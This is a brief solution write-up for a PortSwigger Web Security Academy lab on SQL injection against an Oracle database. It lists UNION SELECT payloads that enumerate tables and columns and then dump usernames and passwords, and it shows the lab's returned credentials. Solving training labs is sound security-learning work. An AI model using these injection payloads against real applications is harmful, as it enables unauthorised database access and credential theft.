# Lab

https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle

## Payload

```sql
/filter?category=Gifts'+UNION+SELECT+NULL,NULL+FROM dual--
```

```sql
/filter?category=Gifts'+UNION+SELECT+table_name,NULL+FROM all_tables--
```

```
...
USERS_GAHUHQ
...
```

```sql
/filter?category=Gifts'+UNION+SELECT+column_name,NULL+FROM all_tab_columns WHERE table_name='USERS_GAHUHQ'--
```

```
USERNAME_EAUFHV
PASSWORD_RIVZIW
```

```sql
/filter?category=Gifts'+UNION+SELECT+USERNAME_EAUFHV,PASSWORD_RIVZIW+FROM+USERS_GAHUHQ--
```

```
administrator, 57zx5b83v47leo8wy6jc
carlos, 4u51a8s4mj5f1d3qmgn5
wiener, m7htogy5psp8to2dzksm
```
